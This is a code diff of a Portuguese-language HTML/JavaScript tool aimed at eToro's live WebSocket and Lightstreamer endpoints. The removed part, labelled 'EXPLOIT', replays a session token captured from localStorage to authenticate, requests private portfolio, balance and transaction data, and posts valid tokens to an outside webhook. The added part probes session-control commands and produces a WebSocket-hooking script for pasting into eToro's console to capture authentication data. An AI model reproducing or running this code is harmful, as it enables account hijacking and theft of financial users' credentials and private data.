yWkQtbnM3aHQ1TF9zcW96czJpaUxINDF6ekI5aU5sMm92NE9rVDdpcWltNGRWbkRmVEptVVBxMFI4WEhUVTBfTjItSTJweXUxb05rd0Fydm9QSU9JcG1NZjBKT0xSRzdoQV80amNtSDVfSEY5Y3ZNNTJ4eE5WV01temUxUlJIX2tJa3dIQ2gyelY3bEQ4cEVaQkpIekVhUEFFZXhucmhRaTluUmRzUmc2NFNuU1hWMVJvOE5EZGV6OUFuOUhlN1VXQTkySjgySHpPY0dkWXZ4VGpZSEhHSGhkZ2t6X2cuMml3ejFGSk5VMm5TdDhqaXBiUV82cm15eGhlcUZYa04wN0ctWFo4aGQ5TSIsImV4cGlyZXNJbk1zIjo4NjQwMDAwMCwiYW50aUNzcmZUb2tlbiI6IiIsImV4cGlyYXRpb25Vbml4VGltZU1zIjoxNzc2MTI5MjQ2NjcyfX0=') {
-                addLog('❌ Cole o token COMPLETO capturado do localStorage!', 'error');
-                addLog('📋 O token começa com "eyJhbGciOiJkaXIi..." mas precisa do token inteiro', 'error');
-                return;
-            }
+        // Teste com headers e parâmetros corretos do Lightstreamer
+        function testLightstreamerReal() {
+            addLog('🚀 Iniciando teste Lightstreamer com parâmetros reais...', 'info');
             
-            addLog('🚀 INICIANDO EXPLOIT COM TOKEN REAL', 'critical');
-            addLog(`🔑 Token: ${token.substring(0, 100)}...`, 'info');
+            // O Lightstreamer espera uma URL específica com parâmetros
+            const lsUrl = "wss://push-lightstreamer.cloud.etoro.com/lightstreamer";
             
-            // Conecta ao endpoint vulnerável
-            ws = new WebSocket("wss://ws.etoro.com/ws");
+            currentWs = new WebSocket(lsUrl);
             
-            ws.onopen = () => {
-                addLog('✅ Conexão cross-origin estabelecida!', 'success');
+            currentWs.onopen = () => {
+                addLog('✅ Conexão TCP estabelecida', 'success');
+                document.getElementById('status').innerHTML = '✅ Conectado, enviando handshake...';
                 
-                // Tenta autenticar com o token capturado
-                const authAttempts = [
-                    {
-                        name: "Formato 1: userKey + apiKey",
-                        data: { userKey: token, apiKey: token }
-                    },
-                    {
-                        name: "Formato 2: Apenas token",
-                        data: { token: token }
-                    },
-                    {
-                        name: "Formato 3: deviceToken",
-                        data: { deviceToken: token }
-                    },
-                    {
-                        name: "Formato 4: jwt",
-                        data: { jwt: token }
-                    },
-                    {
-                        name: "Formato 5: authorization",
-                        data: { authorization: `Bearer ${token}` }
-                    }
-                ];
+                // Handshake completo do Lightstreamer (formato correto)
+                const handshake = [
+                    "create_session",
+                    "LS_protocol=TLCP-2.2.0",
+                    "LS_cid=mgQkwtwdysogQz2BJ4Ji%20kOj2Bg",
+                    "LS_user=anonymous",
+                    "LS_adapter_set=PROXY_PUSH"
+                ].join('\r\n');
                 
-                authAttempts.forEach((attempt, i) => {
-                    setTimeout(() => {
-                        const msg = {
-                            id: crypto.randomUUID(),
-                            operation: "Authenticate",
-                            data: attempt.data
-                        };
-                        ws.send(JSON.stringify(msg));
-                        addLog(`📤 ${attempt.name}: ${JSON.stringify(msg).substring(0, 200)}...`, 'info');
-                    }, i * 3000);
-                });
+                addLog(`📤 Handshake: ${handshake.replace(/\n/g, '\\n')}`, 'info');
+                currentWs.send(handshake);
                 
-                // Depois de tentar autenticar, tenta acessar dados
+                // Depois de 2 segundos, tenta subscribe
                 setTimeout(() => {
-                    const subscribeMsg = {
-                        id: crypto.randomUUID(),
-                        operation: "Subscribe",
-                        data: {
-                            topics: ["private", "portfolio", "positions"],
-                            snapshot: true
-                        }
-                    };
-                    ws.send(JSON.stringify(subscribeMsg));
-                    addLog('📊 Tentando acessar dados PRIVADOS do usuário...', 'critical');
-                }, 15000);
+                    const subscribe = [
+                        "subscribe",
+                        "LS_mode=MERGE",
+                        "LS_group=instrument:100000",
+                        "LS_schema=LastPrice.Price.Change"
+                    ].join('\r\n');
+                    
+                    currentWs.send(subscribe);
+                    addLog(`📤 Subscribe: ${subscribe.replace(/\n/g, '\\n')}`, 'info');
+                }, 2000);
             };
             
-            ws.onmessage = (event) => {
+            currentWs.onmessage = (event) => {
                 let data = event.data;
-                if (typeof data === 'object') data = JSON.stringify(data);
+                if (typeof data === 'object' && data.text) data = data.text;
                 
-                addLog(`📥 RESPOSTA: ${data.substring(0, 500)}`, 
-                       data.includes('success":true') ? 'success' : 'info');
+                addLog(`📥 RECEBIDO: ${data.substring(0, 500)}`, 'success');
                 
-                // Se conseguir autenticar, isso é CRÍTICO
-                if (data.includes('success":true')) {
-                    addLog('🔥🔥🔥 AUTENTICAÇÃO FUNCIONOU! TOKEN É VÁLIDO! 🔥🔥🔥', 'critical');
-                    addLog('🎯 VOCÊ TEM ACESSO AOS DADOS DO USUÁRIO!', 'critical');
-                    
-                    // Envia o token completo para o webhook
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ 
-                            type: 'VALID_TOKEN', 
-                            token: document.getElementById('tokenInput').value,
-                            response: data 
-                        })
-                    });
-                }
-                
-                // Procura por dados sensíveis
-                const sensitivePatterns = ['balance', 'position', 'portfolio', 'email', 'phone', 'address', 'transaction'];
-                for (const pattern of sensitivePatterns) {
-                    if (data.toLowerCase().includes(pattern)) {
-                        addLog(`🔓 DADO SENSÍVEL ENCONTRADO: ${pattern}`, 'critical');
+                // Analisa a resposta do Lightstreamer
+                if (data.includes('CONOK')) {
+                    addLog('🎯 CONOK recebido! Sessão criada com sucesso!', 'critical');
+                    const sessionMatch = data.match(/SESSION_ID[:\s]+([A-Za-z0-9]+)/i);
+                    if (sessionMatch) {
+                        addLog(`🔑 SESSION ID: ${sessionMatch[1]}`, 'critical');
+                        localStorage.setItem('ls_session_id', sessionMatch[1]);
                     }
                 }
-            };
-            
-            ws.onerror = (error) => addLog(`❌ Erro: ${error}`, 'error');
-        }
-        
-        function testTokenOnWebSocket() {
-            addLog('🔄 Testando token diretamente no WebSocket (formato Lightstreamer)', 'info');
-            
-            const ws2 = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-            
-            ws2.onopen = () => {
-                const token = document.getElementById('tokenInput').value;
-                const commands = [
-                    `create_session\r\nLS_user=${token}&LS_adapter_set=PROXY_PUSH`,
-                    `create_session\r\nLS_user=anonymous&LS_token=${token}`,
-                    `control\r\nLS_op=auth&LS_token=${token}`
-                ];
                 
-                commands.forEach((cmd, i) => {
-                    setTimeout(() => {
-                        ws2.send(cmd);
-                        addLog(`📤 Lightstreamer: ${cmd.replace(/\n/g, '\\n').substring(0, 150)}`, 'info');
-                    }, i * 2000);
-                });
+                if (data.includes('PROBE')) {
+                    addLog('📡 Keep-alive PROBE recebido', 'info');
+                    // Responde ao probe
+                    currentWs.send('probe\r\n');
+                    addLog('📤 Resposta PROBE enviada', 'info');
+                }
+                
+                if (data.includes('ERROR')) {
+                    addLog(`❌ Erro Lightstreamer: ${data}`, 'error');
+                }
             };
             
-            ws2.onmessage = (e) => addLog(`📥 Lightstreamer: ${e.data}`, 'info');
+            currentWs.onerror = (error) => {
+                addLog(`❌ Erro: ${error}`, 'error');
+                document.getElementById('status').innerHTML = '❌ Erro na conexão';
+            };
+            
+            currentWs.onclose = (event) => {
+                addLog(`🔌 Fechado: ${event.code} - ${event.reason || 'sem motivo'}`, 'error');
+                document.getElementById('status').innerHTML = `🔌 Desconectado (${event.code})`;
+            };
         }
         
-        function extractUserData() {
-            addLog('🔍 Tentando extrair dados do usuário via WebSocket', 'info');
-            
-            if (!ws || ws.readyState !== WebSocket.OPEN) {
-                addLog('❌ Primeiro execute o EXPLOIT para conectar', 'error');
+        // Testa comandos de controle (como o que você interceptou)
+        function testControlCommands() {
+            if (!currentWs || currentWs.readyState !== WebSocket.OPEN) {
+                addLog('❌ Primeiro conecte com o botão "TESTE CONEXÃO REAL"', 'error');
                 return;
             }
             
-            const queries = [
-                { operation: "GetUserInfo", data: {} },
-                { operation: "GetPortfolio", data: { snapshot: true } },
-                { operation: "GetBalance", data: {} },
-                { operation: "GetPositions", data: { status: "open" } },
-                { operation: "GetTransactions", data: { limit: 50 } }
+            addLog('🎮 Testando comandos de controle...', 'info');
+            
+            const commands = [
+                "control\r\nLS_reqId=1&LS_op=add&LS_table=1&LS_id=1",
+                "control\r\nLS_reqId=2&LS_op=destroy&LS_close_socket=true",
+                "control\r\nLS_reqId=3&LS_op=force&LS_session=*",
+                "status\r\n"
             ];
             
-            queries.forEach((query, i) => {
+            commands.forEach((cmd, i) => {
                 setTimeout(() => {
-                    const msg = {
-                        id: crypto.randomUUID(),
-                        operation: query.operation,
-                        data: query.data
-                    };
-                    ws.send(JSON.stringify(msg));
-                    addLog(`📤 ${query.operation}: ${JSON.stringify(msg)}`, 'info');
+                    currentWs.send(cmd);
+                    addLog(`📤 ${cmd.replace(/\n/g, '\\n')}`, 'info');
                 }, i * 2000);
             });
         }
         
+        // Handshake completo com todos os parâmetros
+        function testWithFullHandshake() {
+            addLog('🤝 Testando handshake completo (todos parâmetros)...', 'info');
+            
+            const fullHandshake = `create_session
+LS_protocol=TLCP-2.2.0
+LS_cid=mgQkwtwdysogQz2BJ4Ji%20kOj2Bg
+LS_user=anonymous
+LS_adapter_set=PROXY_PUSH
+LS_idle_millis=0
+LS_content_length=true`;
+            
+            currentWs = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            
+            currentWs.onopen = () => {
+                addLog('✅ Conectado', 'success');
+                currentWs.send(fullHandshake);
+                addLog(`📤 ${fullHandshake.replace(/\n/g, '\\n')}`, 'info');
+            };
+            
+            currentWs.onmessage = (e) => {
+                let data = e.data;
+                if (typeof data === 'object') data = data.text || JSON.stringify(data);
+                addLog(`📥 ${data.substring(0, 300)}`, 'success');
+            };
+            
+            currentWs.onerror = () => addLog('❌ Erro', 'error');
+        }
+        
+        // INJETAR na página da eToro (executar DENTRO do site)
+        function injectIntoPage() {
+            addLog('💉 Este código deve ser executado DENTRO da página da eToro', 'critical');
+            addLog('📌 Copie o código abaixo e cole no console da eToro:', 'info');
+            
+            const codeToInject = `
+// CÓDIGO PARA EXECUTAR DENTRO DA ETORO
+(function interceptLightstreamer() {
+    console.log('🔍 Procurando conexões Lightstreamer ativas...');
+    
+    // Hook no WebSocket
+    const OriginalWS = window.WebSocket;
+    window.WebSocket = function(...args) {
+        if (args[0].includes('lightstreamer')) {
+            console.log('🎯 LIGHTSTREAMER DETECTADO:', args[0]);
+            const ws = new OriginalWS(...args);
+            
+            // Captura todas as mensagens
+            ws.addEventListener('message', (e) => {
+                console.log('📥 LS MESSAGE:', e.data);
+                if (e.data.includes('CONOK') || e.data.includes('SESSION')) {
+                    console.log('🔥 SESSION DATA:', e.data);
+                }
+            });
+            
+            const originalSend = ws.send;
+            ws.send = function(data) {
+                console.log('📤 LS SEND:', data);
+                if (data.includes('create_session') || data.includes('Authenticate')) {
+                    console.log('🔥 AUTH DATA:', data);
+                }
+                return originalSend.call(this, data);
+            };
+            return ws;
+        }
+        return new OriginalWS(...args);
+    };
+    console.log('✅ Hook instalado! Recarregue a página para capturar.');
+})();
+`;
+            
+            const textarea = document.createElement('textarea');
+            textarea.value = codeToInject;
+            textarea.style.width = '100%';
+            textarea.style.height = '200px';
+            textarea.style.background = '#1a1a2e';
+            textarea.style.color = '#00ff00';
+            textarea.style.fontFamily = 'monospace';
+            document.getElementById('logs').appendChild(textarea);
+        }
+        
         function clearLogs() {
             document.getElementById('logs').innerHTML = '';
+            if (currentWs) currentWs.close();
             addLog('Logs limpos', 'info');
         }
         
-        addLog('✅ EXPLOIT CARREGADO', 'critical');
-        addLog('📌 COLE O TOKEN COMPLETO capturado do localStorage no campo acima', 'critical');
-        addLog('🎯 O token começa com "eyJhbGciOiJkaXIi..." - copie o valor COMPLETO', 'info');
+        addLog('✅ Lightstreamer Deep Test carregado', 'success');
+        addLog('🎯 Clique em "TESTE CONEXÃO REAL" para começar', 'info');
     </script>
 </body>
 </html>
